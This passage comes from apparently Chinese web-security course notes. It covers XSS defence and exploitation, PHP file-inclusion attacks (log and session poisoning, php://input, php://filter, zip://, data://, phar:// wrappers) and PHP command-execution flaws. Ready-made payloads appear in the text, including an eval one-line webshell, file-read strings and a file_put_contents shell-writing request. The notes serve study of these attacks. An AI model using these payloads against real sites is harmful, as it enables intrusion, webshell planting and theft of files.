href="http://weibo.com)遭遇xss蠕虫攻击,受害者被强迫发布带有攻击链接的私信或“3d肉蒲团高清普通话版种子“微博,内容类似“个税起征点有望提到4000”“可以监听别人手机的软件”等含有诱惑性的信息.用户在感染蠕虫的同时会自动关注一位名为“hellosamy”的微博用户,然后向其他好友发送含有同样链接地址的私信./">http://weibo.com)遭遇XSS蠕虫攻击，受害者被强迫发布带有攻击链接的私信或“3D肉蒲团高清普通话版种子“微博，内容类似“个税起征点有望提到4000”“可以监听别人手机的软件”等含有诱惑性的信息。用户在感染蠕虫的同时会自动关注一位名为“hellosamy”的微博用户，然后向其他好友发送含有同样链接地址的私信。</a><br>​新浪微博的XSS蠕虫爆发仅执续了16分钟，感染的用户就达到将近33000个，可见Web蠕虫的危害性十分巨大</p><p><img src="https://pic.imgdb.cn/item/6758f802d0e0a243d4e19387.png"></p><h4 id="4-4-10-XSS攻击防御"><a href="#4-4-10-XSS攻击防御" class="headerlink" title="4.4.10 XSS攻击防御"></a>4.4.10 XSS攻击防御</h4><h5 id="XSS-Filter"><a href="#XSS-Filter" class="headerlink" title="XSS Filter"></a>XSS Filter</h5><p>​XSS Filter的作用是通过<strong>正则的方式</strong>对用户(客户端)请求的参数做脚本的过滤，从而达到防范XSS攻击的效果。<br>XSS Filter作为防御跨站攻击的主要手段之一，已经广泛应用在各类Web系统之中<br>​包括现今的许多应用软件，例如Chrome浏览器，通过加入XSS Filter功能可以有效防范所有非持久型的XSS攻击攻击。</p><h5 id="过滤方法"><a href="#过滤方法" class="headerlink" title="过滤方法"></a>过滤方法</h5><ol><li><p>两种过滤<br>     防御跨站脚本攻击的方式一般有两种：<strong>Input Filtering</strong>和<strong>Output Filtering</strong>，分别在输入端(Input)和输出端(Output)进行过滤，即输入验证和输出过滤。<br>     <strong>输入验证</strong>是对输入的所有数据都须经过验证，验证所有输入数据的长度、类型、语法以及业务规则，被确认安全后才会存入数据库中；<strong>输出过滤</strong>在数据输出前，确保用户提交的数据被正确编码，建议对所有字符进行编码而不仅局限于某个子集。<br>     应用安全国际组织OWASP建议，防护XSS最佳的方法是结合输入验证和输出过滤</p></li><li><p>输入过滤</p></li></ol><p>​“永远不要相信用户的输入”是对设计人员和编码人员说的，是进行安全设计和安全编码的重要准则。换句话说，任何输入数据在证明其无害之前，都是有害的。许多危险的漏洞就是因为过于相信用户的输入是善意的而导致的。</p><p>​对输入数据的过滤，具体可以从两方面着手：<strong>输入验证</strong>和<strong>数据净化</strong>。</p><ul><li>输入验证<br>      输入验证是对输入数据使用<strong>强类型检查</strong>，验证数据的类型、长度、格式、范围等。</li><li>数据净化<br>      数据净化是为了使有潜在危害的数据变得安全。如果所允许的输入范围不能保证输入数据的安全性，数据净化就非常有用。数据净化包括从**<u>删除用户输入字符串后面的空格到去除值等一切行为</u><strong>。在 Web 应用程序中，常见的数据净化示例是使用 <u><strong>URL 编码或HTML编码来包装数据</strong></u>，并将其</strong><u>作为文本而不是可执行脚本来处理</u>**。</li></ul><p>输入验证：</p><p><img src="https://pic.imgdb.cn/item/6758fa12d0e0a243d4e1971a.png"></p><p>输入验证要根据实际情况来设计，下面是一些常见的检测和过滤:<br>（1）输入是否仅仅包含合法的字符;<br>（2）输入字符串是否超过最大长度限制;<br>（3）输入如果为数字，数字是否在指定的范围<br>（4）输入是否符合特殊的格式要求，如E-mail地址、IP地址等，<br>而对于重要敏感的信息，如折扣、价格等，应放到服务器端进行传参与校验等操作。</p><p>数据净化：</p><p>​除了在客户端验证数据的合法性，输入过滤中还需要净化有害的输入，例如以下常见的敏感字符:<br>​&lt;  &gt;  “  &amp;  #  javascript<br>​但是，仅过滤以上敏感字符是远远不够的。为了能够提供两层防御和确保Web应用程序的安全，对Web应用的输出也要进行<strong>过滤和编码</strong>。</p><ol start="3"><li>输出编码</li></ol><p>​当需要将一个字符串输出到Web网页时，同时又不确定这个字符串中是否包括XSS特殊字符(如&lt; &gt; &amp;  ‘ “等)，为了确保输出内容的完整性和正确性，可以使用编码(HTML Encode)进行处理。<br>​HTML编码在防止XSS攻击上起到很大的作用，它主要是用对应的HTML标记换为实体，这样做可确保浏览器显示实体，但不运行他们，将其当作HTML文档的内容而非结构加以处理。一些常见的可能造成问题的字符的HTML编码:</p><p><img src="https://pic.imgdb.cn/item/6758fca2d0e0a243d4e19d3b.png"></p><p>htmlspecialchars()函数可以将以下五种HTML 特殊字符转成字符实体编码:<br>&lt;转成&amp;lt</p><p>&gt;转成    &amp;gt</p><p>&amp;    转成   &amp;amp</p><p>“ 转成   &amp;quot</p><p>‘      转成   &amp;#39</p><p>​如果说对输入数据的过滤是针对可疑的信息进行防范，那么针对输出数据进行编码就是让可能造成危害的信息变成无害。</p><ul><li>输入过滤<br>  在数据存储数据库之前便对<strong>特殊的字符进行转义</strong>，方便简洁，顺便可以把SQL注入等其他漏洞一并检验。而缺点就是<strong>无法处理之前已经存在于数据库中的恶意代码</strong>。</li><li>输出过滤<br>  在数据输出之前先对部分敏感字符进行转义，这是一个很安全的方法，能有效保持数据的完整性。缺点是必须对每一个细节的输出仔细过滤，因此会带来额外的工作量。</li></ul><h5 id="Web安全编码规范"><a href="#Web安全编码规范" class="headerlink" title="Web安全编码规范"></a>Web安全编码规范</h5><p>​在输出数据前对潜在威胁的字符进行编码、转义，是防御XSS攻击的有效措施。<br>​这些输出一般是动态内容。对Web应用而言，其动态内容可能来源于用户输入URL、HTTP头、POST数据、Cookies的值、查询关键字等，所以，在应对不同背景下的动态内容的XSS攻击时，要部署不同的解决方案。</p><ol><li>body文本</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">假设有如下HTML片段</span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>错误: 你的査询 &lt;?=$query?&gt;没有返回任何结果<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line">攻击者可能将动态内容$query替换成恶意的XSS输入:</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>evil_script()<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">返回的HTML代码为:</span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>错误: 你的査询<span class="tag">&lt;<span class="name">script</span>&gt;</span>evil_script()<span class="tag">&lt;/<span class="name">script</span>&gt;</span>没有返回任何结果<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br></pre></td></tr></table></figure><p>防范：</p><p><img src="https://pic.imgdb.cn/item/6758ff93d0e0a243d4e1a3ae.png"></p><ol start="2"><li>HTML标签中的内容</li></ol><p>一些HTML标签如&lt;input&gt;、&lt;style&gt;、&lt;color&gt;等的属性值可能为动态内容，该情况下常存在XSS威胁。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;査询值:$query&lt;/div&gt; 或 &lt;input name=&quot;name&quot; value=&quot;&lt;?=$query?&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>攻击者试图输入&lt;、&gt;等字符产生一个新的&lt;script&gt;标记：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xss&quot;&gt;&lt;script&gt;evil script()&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>然后，返回HTML代码如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;name&quot; value=&quot;xss&quot;&gt;&lt;script&gt;evil script()&lt;/script&gt;&quot;&gt;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/67590096d0e0a243d4e1a43e.png"></p><p>防范:</p><p><img src="https://pic.imgdb.cn/item/67590131d0e0a243d4e1a466.png"></p><ol start="3"><li>&lt;script&gt;&lt;&#x2F;script&gt;中的内容</li></ol><p><img src="https://pic.imgdb.cn/item/6759019fd0e0a243d4e1a475.png"></p><p>防范：</p><p><img src="https://pic.imgdb.cn/item/675901c2d0e0a243d4e1a483.png"></p><ol start="4"><li>JavaScript事件</li></ol><p><img src="https://pic.imgdb.cn/item/6759021cd0e0a243d4e1a496.png"></p><p>防范：</p><p><img src="https://pic.imgdb.cn/item/67590264d0e0a243d4e1a4b4.png"></p><h4 id="4-4-11-XSS相关工具使用"><a href="#4-4-11-XSS相关工具使用" class="headerlink" title="4.4.11 XSS相关工具使用"></a>4.4.11 XSS相关工具使用</h4><h5 id="XSS工具"><a href="#XSS工具" class="headerlink" title="XSS工具"></a>XSS工具</h5><ol><li>Burpsuite的xss检测功能</li></ol><p><img src="https://pic.imgdb.cn/item/675903cbd0e0a243d4e1a545.png"></p><p><img src="https://pic.imgdb.cn/item/67590563d0e0a243d4e1a5c1.png"></p><h5 id="XSS测试平台"><a href="#XSS测试平台" class="headerlink" title="XSS测试平台"></a>XSS测试平台</h5><p>网上找测试平台，搭建在本地服务器上</p><h5 id="XSS漏洞利用"><a href="#XSS漏洞利用" class="headerlink" title="XSS漏洞利用"></a>XSS漏洞利用</h5><p><img src="https://pic.imgdb.cn/item/6759065ad0e0a243d4e1a611.png"></p><p>拿到Cookie：</p><p><img src="https://pic.imgdb.cn/item/67590743d0e0a243d4e1a671.png"></p><p>Cookie的利用方法：</p><p><img src="https://pic.imgdb.cn/item/67590756d0e0a243d4e1a67c.png"></p><h3 id="第五部分-文件包含漏洞原理与验证"><a href="#第五部分-文件包含漏洞原理与验证" class="headerlink" title="第五部分 文件包含漏洞原理与验证"></a>第五部分 文件包含漏洞原理与验证</h3><h4 id="4-5-文件包含"><a href="#4-5-文件包含" class="headerlink" title="4.5 文件包含"></a>4.5 文件包含</h4><h5 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h5><ol><li>概念</li></ol><p>​把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，无需再次编写函数。这一调用文件的过程被称为包含。</p><ol start="2"><li>原理</li></ol><p>​文件包含漏洞产生的原因是在通过PHP函数引入文件时，由于**<u>传入的文件名没有经过合理的校验，从而操作了预想之外的文件</u>**，就可能导致意外的文件泄露甚至恶意的代码注入。<br>​几乎所有的脚本语言都会提供文件包含的功能，但文件包含漏洞在PHP Web Application中居多，而在JSP、ASP、ASP.NET程序中却非常少，这是有些语言设计的弊端。在PHP中经常出现文件包含漏洞，但并不意味着其他语言不存在。</p><h5 id="PHP文件包含"><a href="#PHP文件包含" class="headerlink" title="PHP文件包含"></a>PHP文件包含</h5><ol><li>文件包含函数</li></ol><ul><li>include()：找不到被包含文件时会产生警告(EWARNING)</li><li>include_once()：与include()类似，代码已经被包含则不会再次包含，只包含一次</li><li>require()：找不到被包含的文件时会产生致命错误(ECOMPILE ERROR)</li><li>require_once()：与require()类似，代码已经被包含则不会再次包含，只包含一次</li></ul><ol start="2"><li>利用条件</li></ol><p>（1）include等函数通过动态执行变量的方式引入需要包含的文件</p><p>（2）用户能控制该动态变量</p><ol start="3"><li>文件包含示例</li></ol><p><img src="https://pic.imgdb.cn/item/67592bafd0e0a243d4e1af86.png"></p><p>array.php：</p><p><img src="https://pic.imgdb.cn/item/67592ccbd0e0a243d4e1b01b.png"></p><p>main.php：</p><p><img src="https://pic.imgdb.cn/item/67592cf7d0e0a243d4e1b02f.png"></p><p>访问效果:</p><p><img src="https://pic.imgdb.cn/item/67592d20d0e0a243d4e1b03b.png"></p><p><img src="https://pic.imgdb.cn/item/67592c8fd0e0a243d4e1aff9.png"></p><p>将以上内容注释，引入一个自己写的php文件（包含phpinfo语句）</p><p><img src="https://pic.imgdb.cn/item/67592d58d0e0a243d4e1b053.png"></p><p>访问效果：</p><p><img src="https://pic.imgdb.cn/item/67592f2dd0e0a243d4e1b123.png"></p><p><strong>注意：文件包含漏洞无视文件后缀名</strong></p><ol start="4"><li>文件包含分类</li></ol><p>​文件包含漏洞可以分为<strong>LFl</strong>(Local File Inclusion，本地文件包含)和<strong>RFI</strong>(Remote File Inclusion，远程文件包含)两种。而区分二者最简单的办法就是通过查看php.ini中是否开启了allow_url_include。如果开启就有可能包含远程文件。<br>​远程文件包含需要php.ini中allow_url_include&#x3D;on，allow_url_fopen &#x3D;On。在php.ini中，allow_url_fopen默认一直是On，而allow_url_sinclude从php5.2之后就默认为Off。</p><p><img src="https://pic.imgdb.cn/item/6759301fd0e0a243d4e1b17b.png"></p><ul><li>本地文件包含</li></ul><p><img src="https://pic.imgdb.cn/item/6759310cd0e0a243d4e1b1d3.png"></p><ul><li>远程文件包含</li></ul><p><img src="https://pic.imgdb.cn/item/67593164d0e0a243d4e1b1f1.png"></p><p>​<img src="https://pic.imgdb.cn/item/67593205d0e0a243d4e1b22c.png"></p><h5 id="文件包含漏洞利用"><a href="#文件包含漏洞利用" class="headerlink" title="文件包含漏洞利用"></a>文件包含漏洞利用</h5><ol><li>读取敏感文件：</li></ol><p><img src="https://pic.imgdb.cn/item/675932b5d0e0a243d4e1b27c.png"></p><p><img src="https://pic.imgdb.cn/item/67593309d0e0a243d4e1b2a5.png"></p><ol start="2"><li>本地包含配合文件上传</li></ol><p>​上传一个jpg，是无法解析为php的，因此无法getshell，但是利用文件包含去读取jpg，会无视后缀名，从而进行php的解析，从而getshell</p><p><img src="https://pic.imgdb.cn/item/67593360d0e0a243d4e1b2e7.png"></p><ol start="3"><li>远程包含shell</li></ol><p><img src="https://pic.imgdb.cn/item/67593406d0e0a243d4e1b33b.png"></p><ol start="4"><li>包含Apache日志文件</li></ol><p><img src="https://pic.imgdb.cn/item/675935dfd0e0a243d4e1b3fa.png"></p><p><img src="https://pic.imgdb.cn/item/67593649d0e0a243d4e1b42f.png"></p><p>​<u>bp抓包，将url编码过的字符，更改回原来的样子，然后包含（访问）access.log日志，日志将解析代码，从而显示信息</u></p><p><img src="https://pic.imgdb.cn/item/675939e5d0e0a243d4e1b5f2.png"></p><p><img src="https://pic.imgdb.cn/item/6759394dd0e0a243d4e1b590.png"></p><p>日志默认存储路径：</p><ul><li><p>Apache</p><ul><li><p>Apache +Linux日志默认路径<br>  &#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;access log 或 &#x2F;var&#x2F;log&#x2F;httpd&#x2F;access log</p></li><li><p>Apache+Windows日志默认路径<br>  XAMPP套件：xampp\apache\logs&#x2F;access.log<br>  phpStudy套件：phpStudy\Apache\logs&#x2F;access.log</p></li></ul></li><li><p>IIS</p><ul><li>IIS6 默认日志文件位置<br>  C:WINDOWS\system32\Logfiles</li><li>IIS7 默认日志文件位置<br>  %SystemDrive%\inetpub\logs\LogFiles</li></ul></li><li><p>Nginx</p><ul><li>nginx日志文件在用户安装目录的logs目录下<br>  如安装目录为&#x2F;usr&#x2F;local&#x2F;nginx，则日志目录就是在&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;logs里，也可通过其配置文件nginx.conf，获取到日志的存在路径(&#x2F;opt&#x2F;nginx&#x2F;logs&#x2F;access.log)</li></ul></li></ul><ol start="5"><li>包含SSH日志文件</li></ol><p><img src="https://pic.imgdb.cn/item/67593b65d0e0a243d4e1b752.png"></p><ol start="6"><li>包含session文件</li></ol><p><img src="https://pic.imgdb.cn/item/67593ba4d0e0a243d4e1b76e.png"></p><p><img src="https://pic.imgdb.cn/item/67593bd1d0e0a243d4e1b7d7.png"></p><p><img src="https://pic.imgdb.cn/item/67593c28d0e0a243d4e1b86e.png"></p><p><strong>session文件名&#x3D;sess_ + PHPSESSION的值</strong></p><ol start="7"><li>使用PHP封装伪协议</li></ol><p><img src="https://pic.imgdb.cn/item/67593cbdd0e0a243d4e1b8a4.png"></p><p>（1）php流input：</p><p>​利用php中流的概念，将原本的include的<strong>文件流</strong>重定向到了用户可控制的<strong>输入流</strong>中命令执行(allow_url_ include:on，allow_url_fopen不做要求)</p><p><a href="http://127.0.0.1/include/03/index.php?page=**php://input">http://127.0.0.1/include/03/index.php?page=**php://input</a>**</p><p>用户可输入流就是POST写入部分</p><p><img src="https://pic.imgdb.cn/item/675954afd0e0a243d4e1c6dd.png"></p><p>如果换成这句话，就是生成了一个shell的木马文件</p><p><img src="https://pic.imgdb.cn/item/67595511d0e0a243d4e1c707.png"></p><p>POST部分可以控制输出</p><p><img src="https://pic.imgdb.cn/item/67595540d0e0a243d4e1c719.png"></p><p>（2）php流filter：</p><p>​读取文件(allow_url _include和allow_url_fopen都不做要求)</p><p>​?page&#x3D;<strong>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource</strong>&#x3D;index.php</p><p>​通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。</p><p><img src="https://pic.imgdb.cn/item/675955f4d0e0a243d4e1c73d.png"></p><p>例子：</p><p><img src="https://pic.imgdb.cn/item/6759563dd0e0a243d4e1c74a.png"></p><p>得到之后解码BASE64即可得到数据</p><p>（3）zip:&#x2F;&#x2F;实验</p><p>?page&#x3D;<strong>zip:&#x2F;&#x2F;<strong>C:&#x2F;Users&#x2F;40454&#x2F;Desktop&#x2F;test.jpg</strong>%23</strong>test.txt（此处的%23为#，固定格式，表示zip里的txt文件）</p><p>​本地先将要执行的PHP代码写好文件名为test.txt，将test.txt进行zip压缩，压缩文件名为test.zip，如果可以上传zip文件便直接上传，若不能便将test.zip重命名为test.jpg后再上传，上传之后再利用包含漏洞</p><p><img src="https://pic.imgdb.cn/item/675956ebd0e0a243d4e1c787.png"></p><p>​例子：<strong>只看网站的URL部分的内容</strong></p><p><img src="https://pic.imgdb.cn/item/675957d7d0e0a243d4e1c7c2.png"></p><p>（4）data:&#x2F;&#x2F;</p><p>命令执行(php版本大于等于5.2，allow_url_include和allow_url_fopen都为on的状态)</p><p>?page&#x3D;**data:&#x2F;&#x2F;**text&#x2F;plain,&lt;?php phpinfo();?&gt;</p><p>?page&#x3D;**data:&#x2F;&#x2F;**text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</p><p><img src="https://pic.imgdb.cn/item/67595882d0e0a243d4e1c7db.png"></p><p>例子：<strong>只看网页URL部分</strong></p><p>两种：</p><p><img src="https://pic.imgdb.cn/item/675958b0d0e0a243d4e1c7ef.png"></p><p><img src="https://pic.imgdb.cn/item/675958c8d0e0a243d4e1c7fd.png"></p><p>（5）phar:&#x2F;&#x2F;</p><p>利用姿势:<br>假如有个文件test.txt，打包成zip压缩包，指定绝对路径(或者使用相对路径)</p><p>?page&#x3D;**phar:&#x2F;&#x2F;<strong>C:&#x2F;Users&#x2F;40454&#x2F;Desktop&#x2F;test.zip</strong>&#x2F;**test.txt或</p><p>?page&#x3D;**phar:&#x2F;&#x2F;<strong>C:&#x2F;Users&#x2F;40454&#x2F;Desktop&#x2F;test.jpg</strong>&#x2F;**test.txt</p><p><img src="https://pic.imgdb.cn/item/67595a0ad0e0a243d4e1c88a.png"></p><h6 id="伪协议用法小结"><a href="#伪协议用法小结" class="headerlink" title="伪协议用法小结"></a>伪协议用法小结</h6><p><img src="https://pic.imgdb.cn/item/67595a4bd0e0a243d4e1c8a3.png"></p><h3 id="第六部分-命令执行漏洞原理与验证"><a href="#第六部分-命令执行漏洞原理与验证" class="headerlink" title="第六部分 命令执行漏洞原理与验证"></a>第六部分 命令执行漏洞原理与验证</h3><h4 id="4-6-1-命令执行漏洞概述"><a href="#4-6-1-命令执行漏洞概述" class="headerlink" title="4.6.1 命令执行漏洞概述"></a>4.6.1 命令执行漏洞概述</h4><h5 id="命令执行定义"><a href="#命令执行定义" class="headerlink" title="命令执行定义"></a>命令执行定义</h5><ol><li>基本定义</li></ol><p>​命令执行漏洞是指攻击者可以随意执行系统命令，分为<strong>远程命令执行</strong>(远程代码执行)和<strong>系统命令执行</strong>两类。</p><ol start="2"><li>原理</li></ol><p>​程序应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shellexec、passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击。</p><h5 id="命令执行的条件"><a href="#命令执行的条件" class="headerlink" title="命令执行的条件"></a>命令执行的条件</h5><ul><li>两个条件<ul><li>用户能够控制的函数输入</li><li>存在可以执行代码或者系统命令的危险函数</li></ul></li></ul><h5 id="命令执行成因"><a href="#命令执行成因" class="headerlink" title="命令执行成因"></a>命令执行成因</h5><ul><li>由于开发人员编写源码时，<u>没有针对代码中可执行的特殊函数入口做过滤</u>，导致客户端可以提交恶意构造语句，并提交服务端执行</li><li>命令注入攻击中，<u>Web服务器没有过滤类似system、eval和exec等函数</u>，是该漏洞攻击成功的主要原因。</li></ul><h5 id="命令执行危害"><a href="#命令执行危害" class="headerlink" title="命令执行危害"></a>命令执行危害</h5><ul><li>继承Web服务程序的权限去执行系统命令(任意代码)或读写文件</li><li>反弹shell</li><li>控制整个网站甚至控制服务器</li><li>进一步内网渗透</li></ul><h5 id="命令执行实例"><a href="#命令执行实例" class="headerlink" title="命令执行实例"></a>命令执行实例</h5><p><img src="https://pic.imgdb.cn/item/67595d75d0e0a243d4e1c9b7.png"></p><p><img src="https://pic.imgdb.cn/item/67595dc9d0e0a243d4e1c9c4.png"></p><p><img src="https://pic.imgdb.cn/item/67595e51d0e0a243d4e1c9eb.png"></p><p><img src="https://pic.imgdb.cn/item/67595e76d0e0a243d4e1c9f5.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">以下是一个简单的示例，展示了如何使用array_map函数将一个数组中的每个数字乘以自身：</span><br><span class="line">function cube($n) &#123;</span><br><span class="line">return ($n * $n * $n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = [1, 2, 3, 4, 5];</span><br><span class="line">$b = array_map(&#x27;cube&#x27;, $a);</span><br><span class="line">print_r($b);</span><br><span class="line">在这个例子中，cube函数被应用于数组$a中的每个元素，结果存储在数组$b中。输出将是每个数字的立方。</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/67595ef0d0e0a243d4e1ca0f.png"></p><h5 id="管道符号和通用命令符"><a href="#管道符号和通用命令符" class="headerlink" title="管道符号和通用命令符"></a>管道符号和通用命令符</h5><ol><li>管道符号</li></ol><ul><li>Linux<br>  ;     前面的执行完执行后面的<br>  |    是管道符，显示后面的执行结果<br>  ||  当前面的执行出错时执行后面的</li><li>Windows<br>  &amp;     前面的语句为假则直接执行后面的<br>  &amp;&amp;  前面的语句为假则直接出错，后面的也不执行<br>  |      直接执行后面的语句<br>  ||    前面出错执行后面的</li></ul><ol start="2"><li>通用命令符</li></ol><ul><li><p>command1 &amp;&amp; command2        先执行command1后执行command2</p></li><li><p>command1 | command2            只执行command2</p></li><li><p>command1 &amp; command2           先执行command2后执行command1</p></li></ul><p>​</p><h5 id="命令执行常见场景"><a href="#命令执行常见场景" class="headerlink" title="命令执行常见场景"></a>命令执行常见场景</h5><p>常见场景：</p><ul><li>Ping主机<ul><li><img src="https://pic.imgdb.cn/item/67596187d0e0a243d4e1caf9.png"></li><li>利用管道符，让其不止执行ping，再拼接其他命令执行</li></ul></li><li>DNS请求<ul><li><img src="https://pic.imgdb.cn/item/675961cfd0e0a243d4e1cb00.png"></li><li>同样的，管道符拼接其他指令执行</li></ul></li><li>Office文档<ul><li><img src="https://pic.imgdb.cn/item/675961f9d0e0a243d4e1cb08.png"></li><li>宏病毒</li></ul></li><li>框架缺陷<ul><li><img src="https://pic.imgdb.cn/item/67596225d0e0a243d4e1cb0e.png"></li><li>Struts2参考链接:<a href="https://www.w3cschool.cn/struts_2/">https://www.w3cschool.cn/struts_2/</a></li></ul></li></ul><h4 id="4-6-2-远程命令执行"><a href="#4-6-2-远程命令执行" class="headerlink" title="4.6.2 远程命令执行"></a>4.6.2 远程命令执行</h4><h5 id="远程命令执行漏洞相关函数"><a href="#远程命令执行漏洞相关函数" class="headerlink" title="远程命令执行漏洞相关函数"></a>远程命令执行漏洞相关函数</h5><p>在PHP下，允许命令执行的函数有：</p><ul><li>eval()</li><li>assert()</li><li>preg_replace()</li><li>call_user_func()</li><li>$a($b)</li></ul><p>如果页面中存在这些函数并且对于用户的输入没有做严格的过滤，那么就可能造成远程命令执行漏洞。</p><ol><li>eval()</li></ol><p><img src="https://pic.imgdb.cn/item/6759636dd0e0a243d4e1cb5f.png"></p><p><img src="https://pic.imgdb.cn/item/67598f7ed0e0a243d4e1d6c5.png"></p><p><img src="https://pic.imgdb.cn/item/67598fd5d0e0a243d4e1d6d7.png"></p><p><img src="https://pic.imgdb.cn/item/67599007d0e0a243d4e1d6ed.png"></p><p><img src="https://pic.imgdb.cn/item/6759903fd0e0a243d4e1d709.png"></p><ol start="2"><li>assert()</li></ol><p><img src="https://pic.imgdb.cn/item/67599094d0e0a243d4e1d728.png"></p><p><img src="https://pic.imgdb.cn/item/675990cdd0e0a243d4e1d734.png"></p><p><img src="https://pic.imgdb.cn/item/675990e8d0e0a243d4e1d73d.png"></p><ol start="3"><li>preg_replace()</li></ol><p><img src="https://pic.imgdb.cn/item/6759911fd0e0a243d4e1d74a.png"></p><p><img src="https://pic.imgdb.cn/item/6759918ad0e0a243d4e1d75a.png"></p><ul><li><p>\\n就是第n次捕获的结果进行替换（或$n）</p></li><li><p>\\0代表完整的模式匹配文本</p></li><li><p>.*表示任意</p></li><li><p>&#x2F;e表示把他当作php文本</p></li></ul><p><img src="https://pic.imgdb.cn/item/67599267d0e0a243d4e1d780.png"></p><p>当注释下面那一行，使用上面那一行代码时，多一个[]的匹配</p><p><img src="https://pic.imgdb.cn/item/675992cfd0e0a243d4e1d793.png"></p><p>于是参数需要多一个中括号[]</p><p><img src="https://pic.imgdb.cn/item/67599325d0e0a243d4e1d7a5.png"></p><ol start="4"><li>call_user_func()</li></ol><p><img src="https://pic.imgdb.cn/item/675993a0d0e0a243d4e1d7a9.png"></p><p><img src="https://pic.imgdb.cn/item/675993d8d0e0a243d4e1d7cc.png"></p><p><img src="https://pic.imgdb.cn/item/675993d8d0e0a243d4e1d7cc.png"></p><ol start="5"><li>$a($b)</li></ol><p><img src="https://www.helloimg.com/i/2024/12/11/675996608e36f.png"></p><p><img src="https://www.helloimg.com/i/2024/12/11/675996a37f8d6.png"></p><h5 id="远程命令执行漏洞的利用"><a href="#远程命令执行漏洞的利用" class="headerlink" title="远程命令执行漏洞的利用"></a>远程命令执行漏洞的利用</h5><p>远程命令执行漏洞有以下一些利用方式:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?a=@eval($_POST[666]);//一句话木马</span><br><span class="line">?a=print(_FILE_);//获取当前绝对路径</span><br><span class="line">?a=var_dump(file_get_contents(&#x27;c:\windows\system32\drivers\etc\hosts’));//读取文件</span><br><span class="line">?a=var_dump(file_put_contents($_POST[1],$_POST[2]));</span><br><span class="line">1=shell.php&amp;2=&lt;?php phpinfo()?&gt;//写shell</span><br></pre></td></tr></table></figure><ol><li>一句话木马</li></ol><p><img src="https://www.helloimg.com/i/2024/12/12/675a4974d5c6a.png"></p><ol start="2"><li>获取当前绝对路径</li></ol><p><img src="https://www.helloimg.com/i/2024/12/12/675a4a05b3152.png"></p><ol start="3"><li>读取文件</li></ol><p><img src="https://www.helloimg.com/i/2024/12/12/675a4a4539832.png"></p><ol start="4"><li>写shell</li></ol><p><img src="https://www.helloimg.com/i/2024/12/12/675a4aaddd924.png"></p><h4 id="4-6-3-系统命令执行"><a href="#4-6-3-系统命令执行" class="headerlink" title="4.6.3 系统命令执行"></a>4.6.3 系统命令执行</h4><ol><li>允许系统命令执行的函数有:</li></ol><ul><li>system()</li><li>exec()</li><li>shell_exec()</li><li>passthru(</li><li>popen()</li><li>反引号</li></ul><p>（1）system()</p><img src="https://www.helloimg.com/i/2024/12/12/675a4c659b84d.png" style="zoom:67%;" /><p><img src="https://www.helloimg.com/i/2024/12/12/675a51a524829.png"></p><p>（2）exec()</p><img src="https://www.helloimg.com/i/2024/12/12/675a520a45cea.png" style="zoom:67%;" /><p><img src="https://www.helloimg.com/i/2024/12/12/675a52565611f.png"></p><p>（3）shell_exec()</p><img src="https://www.helloimg.com/i/2024/12/12/675a52b3ad5a5.png" style="zoom:67%;" /><p><img src="https://www.helloimg.com/i/2024/12/12/675a52919b8df.png"></p><p>（4）passthru()</p><img src="https://www.helloimg.com/i/2024/12/12/675a54a698068.png" style="zoom:67%;" /><p><img src="https://www.helloimg.com/i/2024/12/12/675a54d78db00.png"></p><p>（5）popen()</p><img src="https://www.helloimg.com/i/2024/12/12/675a5504efa19.png" style="zoom:67%;" /><p><img src="https://www.helloimg.com/i/2024/12/12/675a55691a775.png"></p><p>需要在原本的代码中写死，popen内的内容</p><p><img src="https://www.helloimg.com/i/2024/12/12/675a559a19d17.png"></p><p>如果popen内容已经写死，那么无论a是多少，都可以输出内容到1.txt中</p><p>（6）反引号</p><p>与popen类似，在服务器代码中已经写死</p><p><img src="https://www.helloimg.com/i/2024/12/12/675a569ea3dfe.png"></p><p><img src="https://www.helloimg.com/i/2024/12/12/675a56728176b.png"></p><ol start="2"><li>系统命令执行漏洞有以下一些利用方式：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span 